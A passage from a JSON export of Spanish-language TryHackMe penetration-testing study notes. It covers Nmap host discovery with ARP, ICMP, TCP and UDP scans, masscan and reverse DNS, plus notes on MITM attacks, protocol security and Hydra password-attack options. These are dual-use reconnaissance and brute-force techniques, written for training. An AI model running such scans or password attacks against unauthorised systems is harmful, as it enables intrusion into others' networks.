    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/3. Nmap Live Host Discovery/1. Introduction]]\n[[2. Subnetworks]]\n[[3. Enumerating Targets]]\n[[4. Discovering Live Hosts]]\n[[5. Nmap Host Discovery Using ARP]]\n[[6. Nmap Host Discovery Using ICMP]]\n[[7. Nmap Host Discovery Using TCP and UDP]]\n[[8. Using Reverse-DNS Lookup]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/3. Nmap Live Host Discovery/9. Summary]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "9. Summary",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/3-nmap-live-host-discovery/9-summary/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/3. Nmap Live Host Discovery/9. Summary.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 3. Nmap Live Host Discovery",
    "content": "Hemos aprendido como ARP, ICMP, TCP y UDP pueden detectar hosts  activos.\n\n| Tipo de Escaneo        | Comando de Ejemplo                          |\n| ---------------------- | ------------------------------------------- |\n| ARP Scan               | `sudo nmap -PR -sn MACHINE_IP/24`           |\n| ICMP Echo Scan         | `sudo nmap -PE -sn MACHINE_IP/24`           |\n| ICMP Timestamp Scan    | `sudo nmap -PP -sn MACHINE_IP/24`           |\n| ICMP Address Mask Scan | `sudo nmap -PM -sn MACHINE_IP/24`           |\n| TCP SYN Ping Scan      | `sudo nmap -PS22,80,443 -sn MACHINE_IP/30`  |\n| TCP ACK Ping Scan      | `sudo nmap -PA22,80,443 -sn MACHINE_IP/30`  |\n| UDP Ping Scan          | `sudo nmap -PU53,161,162 -sn MACHINE_IP/30` |\n\nRecuerda a√±adir `-sn` si s√≥lo est√°s interesado en los hosts sin el escaneo de puertos.\n\n| Opci√≥n | Prop√≥sito                                      |\n| ------ | ---------------------------------------------- |\n| `-n`   | No mira DNS                                    |\n| `-R`   | Mira reverse-DNS para todos los posibles hosts |\n| `-sn`  | S√≥lo descubrimiento de hosts                   |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Nmap Host Discovery Using ARP",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/3-nmap-live-host-discovery/5-nmap-host-discovery-using-arp/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/3. Nmap Live Host Discovery/5. Nmap Host Discovery Using ARP.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 3. Nmap Live Host Discovery",
    "content": "¬øC√≥mo podr√≠as saber qu√© hosts est√°n activos y corriendo? Es esencial evitar gastar nuestro tiempo escaneando los puertos de un dispositivo offline o una direcci√≥n IP sin uso. Hay varias maneras de descubrir hosts online. Cuando no se dan opciones de host discovery, Nmap sigue el siguiente acercamiento para descubrirlos.\n\n1. Cuando un usuario privilegiado trata de escanear objetivos en una red local (Ethernet), Nmap usa peticiones ARP.\n2. Cuando un usuario privilegiado trata de escanear objetivos externos a la red local, Nmap usa peticiones echo ICMP, TCP ACK al puerto 80, TCP SYN al puerto 443 e ICMP petici√≥n timestamp.\n3. Cuando un usuario sin privilegios trata de escanear objetivos fuera de la red local, Nmap se queda con un TCP 3-way handdshake mandando paquetes SYN a los puertos 80 y 443.\n\nNmap usa ICMP por defecto para detectar hosts activos y luego los escanea. Si quieres usar Nmap para descubrir hosts activos sin escanear puertos, puedes usar la opci√≥n `-sn`.\n\nEl escaneo ARP es posible s√≥lo si est√°s en la musma subred que el objetivo. En un Ethernet (802.3) y WiFi (802.11), necesitas saber la direcci√≥n MAC de cualquier sistema antes de poder comunicarte con √©l. Si s√≥lo quieres que Nmap escanee ARP sin puertos debes usar `nmap -PR -sn` donde `-PR` indica que s√≥lo quieres escaneo ARP. El siguiente ejemplo muestra a Nmap usando ARP para descubrimiento de hosts.\n\n```shell\npentester@TryHackMe$ sudo nmap -PR -sn 10.10.210.6/24  \nStarting Nmap 7.60 ( https://nmap.org ) at 2021-09-02 07:12 BST \nNmap scan report for ip-10-10-210-75.eu-west-1.compute.internal (10.10.210.75) \nHost is up (0.00013s latency). \nMAC Address: 02:83:75:3A:F2:89 (Unknown) \nNmap scan report for ip-10-10-210-100.eu-west-1.compute.internal (10.10.210.100) \nHost is up (-0.100s latency). \nMAC Address: 02:63:D0:1B:2D:CD (Unknown) \nNmap scan report for ip-10-10-210-165.eu-west-1.compute.internal (10.10.210.165) \nHost is up (0.00025s latency). \nMAC Address: 02:59:79:4F:17:B7 (Unknown) \nNmap scan report for ip-10-10-210-6.eu-west-1.compute.internal (10.10.210.6) \nHost is up. \nNmap done: 256 IP addresses (4 hosts up) scanned in 3.12 seconds\n```\n\nARP hace una petici√≥n a todos los dispositivos de la subred y los que est√°n activos responden con su MAC e IP.\n\n![[Pasted image 20251118181202.png]]\n\nSi miramos los paquetes con una herramienta como Wireshark, veremos el tr√°fico de red similar a la imagen de abajo. \n\n![[Pasted image 20251118181250.png]]\n\nDeber√≠amos mencionar un esc√°ner construido alrededor de peticiones ARP: `arp-scan`. Ofrece muchas opciones para personalizar el escaneo. Visita la [wiki de arp-scan](http://www.royhills.co.uk/wiki/index.php/Main_Page) para obtener m√°s informaci√≥n. Una opci√≥n popular es `arp-scan --localnet` o `arp-scan -l`. Si el sistema tiene m√°s de una interfaz y est√°s interesado en saber cu√°les est√°n conectados a elle podemos usar `arp-scan -I <interfaz> -l`.\n\n```shell\npentester@TryHackMe$ sudo arp-scan 10.10.210.6/24 \nInterface: eth0, datalink type: EN10MB (Ethernet) \nWARNING: host part of 10.10.210.6/24 is non-zero \nStarting arp-scan 1.9 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/) \n10.10.210.75\t02:83:75:3a:f2:89\t(Unknown) \n10.10.210.100\t02:63:d0:1b:2d:cd\t(Unknown) \n10.10.210.165\t02:59:79:4f:17:b7\t(Unknown)  \n4 packets received by filter, 0 packets dropped by kernel \nEnding arp-scan 1.9: 256 hosts scanned in 2.726 seconds (93.91 hosts/sec). 3 responded\n```\n\nDe forma similar, el comando arp-scan generar√° bastantes peticiones ARP que podemos ver usando tcpdump, Wireshark u otra herramienta similar.\n\n![[Pasted image 20251118182528.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Using Reverse-DNS Lookup",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/3-nmap-live-host-discovery/8-using-reverse-dns-lookup/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/3. Nmap Live Host Discovery/8. Using Reverse-DNS Lookup.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 3. Nmap Live Host Discovery",
    "content": "El comportamiento por defecto de Nmap es usar reverse-DNS. Esto es porque los hostnames pueden revelar mucho. Sin embargo, si no quieres mandar estas queries DNS puedes usar `-n`.\n\nPor defecto, Nmap mirar√° los hosts activos, sin embargo, puedes usar la opci√≥n `-R` para hacer una query al servidor DNS incluso para los hosts offline. Si quieres usar un servidor DNS espec√≠fico, puedes a√±adir la opci√≥n `--dns-servers <DNS_SERVER>`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Enumerating Targets",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/3-nmap-live-host-discovery/3-enumerating-targets/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/3. Nmap Live Host Discovery/3. Enumerating Targets.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 3. Nmap Live Host Discovery",
    "content": "Hemos mencionado diferentes t√©cnicas que podemos usar para escanear. Antes de explicar cada detalle y ponerlo en uso contra un objetivo activo, necesitamos especificar los objetivos que queremos escanear. Podemos concretar una lista, rango o subred.\n\n- **Lista:** `<IP> scanme.nmap.org example.com` Escanear√° 3 direcciones.\n- **Rango:** `10.11.12.15-20` Escanear√° 6 direcciones.\n- **Subred:** `<IP>/30` Escanear√° 4 direcciones. Si no entiendes por qu√© debes estudiar subnetting primero.\n\nTambi√©n puedes ofrecer una lista como archivo: `nmap -iL lista_de_hosts.txt`.\n\nSi quieres que compruebe la lista de objetivos pero sin escanearlos, puedes usar `nmap -sL objetivos`. Esta opci√≥n te dar√° una lista detallada de los objetivos que va a escanear. Sin embargo, lanzar√° una resoluci√≥n DNS inversa para intentar encontrar los nombres de dominio de las respectivas direcciones. Si no quieres que haga esto, a√±ade el par√°metro `-n`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Subnetworks",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/3-nmap-live-host-discovery/2-subnetworks/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/3. Nmap Live Host Discovery/2. Subnetworks.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 3. Nmap Live Host Discovery",
    "content": "Revisemos algunos conceptos antes de movernos hacia las tareas principales. Un segmento de red es un grupo de ordenadores conectados usando un medio compartido. Un segmento de red es una conexi√≥n f√≠sica mientras que una subred es una conexi√≥n l√≥gica.\n\nEn el siguiente diagrama tenemos 4 segmentos de red o subredes. Generalmente, tu sistema estar√≠a conectado a uno de estos segmentos/subredes. Una subred tiene su propio rango de IPs y est√° conectada a redes m√°s extensas v√≠a router.\n\n![[Pasted image 20251117231032.png]]\n\nLa figura muestra dos tipos de subred:\n\n- Subredes con `/16`, lo que significa que la m√°scara de subred puede ser escrita como `255.255.0.0` y tiene 65536 hosts.\n- Subredes con `/24`, que indican que la m√°scara de subred puede ser expresada como `255.255.255.0` y tiene 256 hosts.\n\nPuede que quieras repasar [[0. Introduction to LAN]] si est√°s muy perdido.\n\nComo parte del reconocimiento activo, queremos descubrir m√°s informaci√≥n sobre un grupo de hosts o subred. Si estamos conectados a la misma subred, el esc√°ner depender√° de ARP (Address Resolution Protocol) para descubrir hosts activos. Una query ARP busca obtener la direcci√≥n MAC para que la comunicaci√≥n sea posible.\n\nSi est√°s en la red A, puedes usar ARP s√≥lo para descubrir hosts activos en esa subred (10.1.100.0/24). Sup√≥n que est√°s conectado a una subred diferente de la subred del objetivo. En este caso, los paquetes generados por tu esc√°ner ser√°n enrutados v√≠a default gateway (puerta de enlace predeterminada) para alcanzar objetivos en otra subred. Sin embargo, las queries ARP no ser√°n enrutadas por lo lo que no cruzar√°n el router. ARP es un protocolo de Capa 2 (Link Layer) y no de Capa 3 (Network), como s√≠ lo son los routers.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Nmap Host Discovery Using TCP and UDP",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/3-nmap-live-host-discovery/7-nmap-host-discovery-using-tcp-and-udp/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/3. Nmap Live Host Discovery/7. Nmap Host Discovery Using TCP and UDP.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 3. Nmap Live Host Discovery",
    "content": "<h2>TCP SYN Ping</h2>\nPodemos mandar un paquete con la flag SYN (Synchronize) al puerto TCP 80 (por defecto) y esperar una respuesta. Un puerto abierto debe responder con SYN/ACK (Acknowledge), mientras que uno cerrado responder√° con RST (Reset). En este caso s√≥lo comprobamos que obtengamos alguna respuesta, el estado espec√≠fico del puerto es irrelevante.\n\n![[Pasted image 20251119001336.png]]\n\nSi quieres que Nmap use el TCP SYN ping, debes usar `-PS` seguido del n√∫mero del puerto (`-PS21` o `-PS21-25`). Los usuarios con privilegios pueden mandarlo sin completar el 3-way handshake. aunque el puerto est√© abierto.\n\n![[Pasted image 20251119001536.png]]\n\nVeamos un ejemplo:\n\n```shell\npentester@TryHackMe$ sudo nmap -PS -sn 10.10.68.220/24\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-09-02 13:45 EEST\nNmap scan report for 10.10.68.52\nHost is up (0.10s latency).\nNmap scan report for 10.10.68.121\nHost is up (0.16s latency).\nNmap scan report for 10.10.68.125\nHost is up (0.089s latency).\nNmap scan report for 10.10.68.134\nHost is up (0.13s latency).\nNmap scan report for 10.10.68.220\nHost is up (0.11s latency).\nNmap done: 256 IP addresses (5 hosts up) scanned in 17.38 seconds\n```\n\nVeamos como aparece la captura de paquetes en Wireshark:\n\n![[Pasted image 20251119001626.png]]\n\n------------------------------------\n<h2>TCP ACK Ping</h2>\nComo puedes haber adivinado, esto manda un paquete con la flag ACK. Debes correr Nmap como usuario privilegiado.\n\nSe usa el puerto 80 por defecto. La sintaxis es similar a la de TCP SYN ping, solo que ahora la opci√≥n es `-PA`. El puerto, si est√° activo, responde con un RST ya que el paquete no forma parte de ninguna comunicaci√≥n activa.\n\n![[Pasted image 20251119001920.png]]\n\nVeamos un ejemplo:\n\n```shell\npentester@TryHackMe$ sudo nmap -PA -sn 10.10.68.220/24\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-09-02 13:46 EEST\nNmap scan report for 10.10.68.52\nHost is up (0.11s latency).\nNmap scan report for 10.10.68.121\nHost is up (0.12s latency).\nNmap scan report for 10.10.68.125\nHost is up (0.10s latency).\nNmap scan report for 10.10.68.134\nHost is up (0.10s latency).\nNmap scan report for 10.10.68.220\nHost is up (0.10s latency).\nNmap done: 256 IP addresses (5 hosts up) scanned in 29.89 seconds\n```\n\nSi le echamos un vistazo al tr√°fico de red descubriremos varios paquetes con la flag ACK.\n\n![[Pasted image 20251119002017.png]]\n\n---------------------------------------------\n<h2>UDP Ping</h2>\nFinalmente, podemos usar UDP para descubrir si el host est√° online. Al contrario que con TCP SYN ping, mandar un paquete UDP a un puerto abierto no espera respuesta alguna. Sin embargo, si mandamos un paquete UDP a un puerto UDP cerrado, recibiremos un ICMP port unreachable, lo cual indica que el host est√° activo.\n\n![[Pasted image 20251119002454.png]]\n\nLa sintaxis espec√≠fica es similar a las anteriores pero con la opci√≥n `-PU`.\n\n```shell\npentester@TryHackMe$ sudo nmap -PU -sn 10.10.68.220/24\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-09-02 13:45 EEST\nNmap scan report for 10.10.68.52\nHost is up (0.10s latency).\nNmap scan report for 10.10.68.121\nHost is up (0.10s latency).\nNmap scan report for 10.10.68.125\nHost is up (0.14s latency).\nNmap scan report for 10.10.68.134\nHost is up (0.096s latency).\nNmap scan report for 10.10.68.220\nHost is up (0.11s latency).\nNmap done: 256 IP addresses (5 hosts up) scanned in 9.20 seconds\n```\n\nInspeccionemos los paquetes UDP generados con Wireshark:\n\n![[Pasted image 20251119002558.png]]\n\n---------------------------------------------\n<h2>Masscan</h2>\nMasscan usa un acercamiento similar para descubrir los sistemas disponibles. Sin embargo, para acabar este escaneo r√°pido, Masscan es bastante agresivo con la cantidad de paquetes que genera. La sintaxis es similar, `-p` puede ir seguido de un puerto, lista o rango.\n\n- `masscan MACHINE_IP/24 -p443`\n- `masscan MACHINE_IP/24 -p80,443`\n- `masscan MACHINE_IP/24 -p22-25`\n- `masscan MACHINE_IP/24 ‚Äê‚Äêtop-ports 100`\n\nPuedes instalar Masscan haciendo `sudo apt install masscan`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Nmap Host Discovery Using ICMP",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/3-nmap-live-host-discovery/6-nmap-host-discovery-using-icmp/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/3. Nmap Live Host Discovery/6. Nmap Host Discovery Using ICMP.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 3. Nmap Live Host Discovery",
    "content": "Podemos hacer ping a cada direcci√≥n IP en la red objetivo y ver qui√©n responde. Aunque ser√≠a el enfoque m√°s directo, no siempre es confiable. Muchos firewalls bloquean los paquetes ICMP echo (las nuevas versiones de MS Windows la bloquean por defecto). Recuerda que antes de una petici√≥n ICMP va una petici√≥n ARP.\n\nPara usar ICMP echo, a√±ade la opci√≥n `-PE`.\n\n![[Pasted image 20251118232901.png]]\n\nEn el ejemplo de abajo podemos ver un ejemplo en el que mandaremos paquetes ICMP echo a cada direcci√≥n IP en la subred objetivo. A√±adimos `-sn` para que no realice un escaneo de puertos.\n\n```shell\npentester@TryHackMe$ sudo nmap -PE -sn 10.10.68.220/24  \n\nStarting Nmap 7.60 ( https://nmap.org ) at 2021-09-02 10:16 BST \nNmap scan report for ip-10-10-68-50.eu-west-1.compute.internal (10.10.68.50) \nHost is up (0.00017s latency). \nMAC Address: 02:95:36:71:5B:87 (Unknown) \nNmap scan report for ip-10-10-68-52.eu-west-1.compute.internal (10.10.68.52) \nHost is up (0.00017s latency). \nMAC Address: 02:48:E8:BF:78:E7 (Unknown) \nNmap scan report for ip-10-10-68-77.eu-west-1.compute.internal (10.10.68.77) \nHost is up (-0.100s latency). \nMAC Address: 02:0F:0A:1D:76:35 (Unknown) \nNmap scan report for ip-10-10-68-110.eu-west-1.compute.internal (10.10.68.110) \nHost is up (-0.10s latency). \nMAC Address: 02:6B:50:E9:C2:91 (Unknown) \nNmap scan report for ip-10-10-68-140.eu-west-1.compute.internal (10.10.68.140) \nHost is up (0.00021s latency). \nMAC Address: 02:58:59:63:0B:6B (Unknown) \nNmap scan report for ip-10-10-68-142.eu-west-1.compute.internal (10.10.68.142) \nHost is up (0.00016s latency). \nMAC Address: 02:C6:41:51:0A:0F (Unknown) \nNmap scan report for ip-10-10-68-220.eu-west-1.compute.internal (10.10.68.220) \nHost is up (0.00026s latency). \nMAC Address: 02:25:3F:DB:EE:0B (Unknown) \nNmap scan report for ip-10-10-68-222.eu-west-1.compute.internal (10.10.68.222) \nHost is up (0.00025s latency). \nMAC Address: 02:28:B1:2E:B0:1B (Unknown) \nNmap done: 256 IP addresses (8 hosts up) scanned in 2.11 seconds\n```\n\nEl output del escaneo muestra que 8 hosts est√°n activos. Adem√°s, muestra sus direcciones MAC. No esperamos recibir direcciones MAC a no ser que estemos en la misma red por lo que el output de arriba revela que estamos en la misma subred ya que hemos recibido las respuestas ARP.\n\nAhora realizaremos el mismo escaneo pero desde una m√°quina de otra subred.\n\n```shell\npentester@TryHackMe$ sudo nmap -PE -sn 10.10.68.220/24  \n\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-09-02 12:16 EEST \nNmap scan report for 10.10.68.50 \nHost is up (0.12s latency). \nNmap scan report for 10.10.68.52 \nHost is up (0.12s latency). \nNmap scan report for 10.10.68.77 \nHost is up (0.11s latency). \nNmap scan report for 10.10.68.110 \nHost is up (0.11s latency). \nNmap scan report for 10.10.68.140 \nHost is up (0.11s latency). \nNmap scan report for 10.10.68.142 \nHost is up (0.11s latency). \nNmap scan report for 10.10.68.220 \nHost is up (0.11s latency). \nNmap scan report for 10.10.68.222 \nHost is up (0.11s latency). \nNmap done: 256 IP addresses (8 hosts up) scanned in 8.26 seconds\n```\n\nSi miras los paquetes de red usando una herramienta como Wireshark ver√°s lo siguiente:\n\n![[Pasted image 20251118233427.png]]\n\nDebido a que las peticiones ICMP Echo suelen ser bloqueadas, puedes considerar ICMP Timestamp o ICMP Address Mask para averiguar si est√° activo. Nmap usa estas, tipo 13 y 14, respectivamente, a√±adiendo la opci√≥n `-PP` para determinar si el host est√° activo.\n\n![[Pasted image 20251118233623.png]]\n\nEn el siguiente ejemplo ejecutamos esto mismo.\n\n```shell\npentester@TryHackMe$ sudo nmap -PP -sn 10.10.68.220/24  \n\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-09-02 12:06 EEST \nNmap scan report for 10.10.68.50 \nHost is up (0.13s latency). \nNmap scan report for 10.10.68.52 \nHost is up (0.25s latency). \nNmap scan report for 10.10.68.77 \nHost is up (0.14s latency). \nNmap scan report for 10.10.68.110 \nHost is up (0.14s latency). \nNmap scan report for 10.10.68.140 \nHost is up (0.15s latency). \nNmap scan report for 10.10.68.209 \nHost is up (0.14s latency). \nNmap scan report for 10.10.68.220 \nHost is up (0.14s latency). \nNmap scan report for 10.10.68.222 \nHost is up (0.14s latency). \nNmap done: 256 IP addresses (8 hosts up) scanned in 10.93 seconds\n```\n\nSi capturamos los paquetes en Wireshark vemos lo siguiente:\n\n![[Pasted image 20251118233815.png]]\n\nNmap usa las queries de Address Mask (tipo 17) y su respuesta (tipo 18) con la opci√≥n `-PM`. de la siguiente manera.\n\n![[Pasted image 20251118233912.png]]\n\nAqu√≠ podemos ver un ejemplo. Aunque por escaneos pasados sabemos que est√° activo en este escaneo no devolvi√≥ nada. La raz√≥n es que hay un FireWall bloqueando este tipo de tr√°fico.\n\n```shell\npentester@TryHackMe$ sudo nmap -PM -sn 10.10.68.220/24\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-09-02 12:13 EEST\nNmap done: 256 IP addresses (0 hosts up) scanned in 52.17 seconds\n```\n\nAunque no obtuvimos respuesta, aqu√≠ podemos ver una captura del tr√°fico:\n\n![[Pasted image 20251118234053.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Discovering Live Hosts",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/3-nmap-live-host-discovery/4-discovering-live-hosts/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/3. Nmap Live Host Discovery/4. Discovering Live Hosts.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 3. Nmap Live Host Discovery",
    "content": "Recordemos las capas TCP/IP. Usaremos estos protcolos para descubrir los hosts activos. Empezando de abajo hacia arriba, podemos usar:\n\n- ARP de la capa de enlace.\n- ICMP de la capa de red.\n- TCP de la capa de transporte.\n- UDP de la capa de transporte.\n\n![[Pasted image 20251118155142.png]]\n\nAntes de ver c√≥mo los esc√°ners pueden usar cada uno en detalle, veremos brevemente estos cuatro protocolos. ARP tiene un prop√≥sito, mandar un marco a la direcci√≥n broadcast en el segmento de red y preguntar a los ordenadores con una IP espec√≠fica que respondan con su direcci√≥n MAC.\n\nICMP tiene varios tipos. ICMP ping usa el tipo 8 (echo) y el tipo 0 (echo reply).\n\nSi quieres hacer ping a un sistema en la misma subred, una petici√≥n ARP deber√≠a preceder al ICMP echo.\n\nAunque TCP y UDP son de la capa de transporte, para prop√≥sitos de escaneo de red, un esc√°ner puede mandar un paquete crafteaddo especialmente a puertos TCP o UDP comunes para comprobar si el onjetivo responde. Este m√©todo es bastante √∫til cuando ICMP est√° bloqueado.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Man-in-the-Middle (MITM) Attack",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/8-protocols-and-servers-2/3-man-in-the-middle-mitm-attack/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/8. Protocols and Servers 2/3. Man-in-the-Middle (MITM) Attack.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 8. Protocols and Servers 2",
    "content": "Un ataque MITM ocurre cuando la v√≠ctima (A) piensa que se est√° comunicando con el receptor (B) pero hay un atacante (E) interceptando (y modificando, si quiere) todas las comunicaciones.\n\n![[Pasted image 20251121142531.png]]\n\nEste ataque es relativamente simple de realizar si las dos partes no confirman la autenticidad e integridad de cada mensaje. En algunos casos, el protocolo elegido no ofrece autentificaci√≥n segura o comprobaci√≥n de integridad. Adem√°s, algunos protocolos tienen inseguridades inherentes que los hacen susceptibles a este tipo de ataques.\n\nSiempre que navegas a trav√©s de HTTP en lugar de HTTPS, por ejemplo, eres susceptible de recibir este tipo de ataque y lo preocupante es que no puedes saberlo. Adem√°s hay varias herramientas que ayudan a los atacantes a realizar este tipo de ataques como [Ettercap](https://www.ettercap-project.org/) o [Bettercap](https://www.bettercap.org/).\n\nLa soluci√≥n recae en el uso de criptograf√≠a, la correcta autentificaci√≥n y firma de paquetes. Con la ayuda de PKI (Private Key Infrastructure) y certificados de ra√≠z confiables, el TLS (Transport Layer Security) puede proteger contra ataques MITM.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/8-protocols-and-servers-2/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/8. Protocols and Servers 2/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 8. Protocols and Servers 2",
    "content": "En la unidad anterior cubrimos varios protocolos:\n\n- Telnet\n- HTTP\n- FTP\n- SMTP\n- POP3\n- IMAP\n\nLos servidores que implementan estos protocolos son susceptibles a diferentes tipos de ataques. Por nombrar algunos que considerar:\n\n1. Sniffing Attack (captura de paquetes de red).\n2. Man-in-the-Middle (MITM) Attack.\n3. Password Attack (ataque de autentificaci√≥n)\n4. Vulnerabilidades.\n\nDesde la perspectiva de la seguridad, siempre necesitamos pensar sobre qu√© tratamos de proteger. Considera la tr√≠ada de la seguridad: Confidencialidad, Integridad y Disponibilidad.\n\nSi tienes dudas sobre esta tr√≠ada (CIA) o su contraparte (DAD) visita la unidad [[0. Security Principles]].\n\nPor ejemplo, un ataque de captura de paquetes en estos servicios viola el principio de confidencialidad, pudiendo llevar a un problema de divulgaci√≥n. Las vulnerabilidades son un espectro m√°s amplio, y las cubriremos m√°s adelante.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Summary",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/8-protocols-and-servers-2/7-summary/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/8. Protocols and Servers 2/7. Summary.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 8. Protocols and Servers 2",
    "content": "En esta unidad hemos visto varios protocolos, su uso, ataques contra ellos y medidas de mitigaci√≥n.\n\n| Protocolo | Puerto TCP | Aplicaci√≥n(es)                  | Seguridad de la Informaci√≥n |\n| --------- | ---------- | ------------------------------- | --------------------------- |\n| FTP       | 21         | File Transfer                   | Cleartext                   |\n| FTPS      | 990        | File Transfer                   | Encrypted                   |\n| HTTP      | 80         | Worldwide Web                   | Cleartext                   |\n| HTTPS     | 443        | Worldwide Web                   | Encrypted                   |\n| IMAP      | 143        | Email (MDA)                     | Cleartext                   |\n| IMAPS     | 993        | Email (MDA)                     | Encrypted                   |\n| POP3      | 110        | Email (MDA)                     | Cleartext                   |\n| POP3S     | 995        | Email (MDA)                     | Encrypted                   |\n| SFTP      | 22         | File Transfer                   | Encrypted                   |\n| SSH       | 22         | Remote Access and File Transfer | Encrypted                   |\n| SMTP      | 25         | Email (MTA)                     | Cleartext                   |\n| SMTPS     | 465        | Email (MTA)                     | Encrypted                   |\n| Telnet    | 23         | Remote Access                   | Cleartext                   |\nAdem√°s hemos visto una herramienta para realizar ataques de contrase√±as, Hydra.\n\n| Opci√≥n            | Explicaci√≥n                                                       |\n| ----------------- | ----------------------------------------------------------------- |\n| `-l username`     | Ofrece el nombre de usuario                                       |\n| `-P WordList.txt` | Especifica el diccionario a usar                                  |\n| `server service`  | Configura la direcci√≥n del servidor y el servicio a atacar.       |\n| `-s PORT`         | Usar en caso de que el servicio no est√© en su puerto por defecto. |\n| `-V` or `-vV`     | Muestra las combinaciones que se est√°n usando.                    |\n| `-d`              | Muestra la depuraci√≥n si verbose no ayuda.                        |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Protocols and Servers 2",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/8-protocols-and-servers-2/0-protocols-and-servers-2/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/8. Protocols and Servers 2/0. Protocols and Servers 2.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 8. Protocols and Servers 2",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/8. Protocols and Servers 2/1. Introduction]]\n[[2. Sniffing Attack]]\n[[3. Man-in-the-Middle (MITM) Attack]]\n[[4. Transport Layer Security (TLS)]]\n[[5. Secure Shell (SSH)]]\n[[6. Password Attack]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/8. Protocols and Servers 2/7. Summary]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Sniffing Attack",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/8-protocols-and-servers-2/2-sniffing-attack/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/8. Protocols and Servers 2/2. Sniffing Attack.md",
